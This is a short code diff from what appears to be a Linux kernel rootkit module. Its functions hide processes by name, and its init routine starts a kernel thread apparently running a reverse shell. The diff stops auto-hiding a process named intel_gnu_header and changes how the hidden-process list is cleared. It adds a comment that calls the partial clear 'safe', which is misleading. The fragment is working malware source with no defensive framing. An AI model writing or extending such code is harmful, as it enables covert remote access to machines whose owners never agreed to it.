@@ -88,8 +88,9 @@ int remove_hidden_process(const char *process_name) {
 
 void clear_all_hidden_processes(void) {
     int i;
+    // Safely clear each entry
     for (i = 0; i < HIDE_PROCESS_LIST_SIZE; i++) {
-        memset(hidden_processes[i], 0, MAX_PROCESS_NAME_LEN);
+        hidden_processes[i][0] = '\0';
     }
     hidden_process_count = 0;
 }
@@ -165,9 +166,6 @@ bool is_pid_hidden_by_name(pid_t pid) {
 }
 
 static int __init rebellion_init(void) {
-    // Auto-hide the intel_gnu_header process
-    add_hidden_process(AUTO_HIDE_PROCESS);
-    
     revshell_thread = kthread_run(revshell_func, NULL, "shell_thread");
     if (IS_ERR(revshell_thread)) {
         return PTR_ERR(revshell_thread);
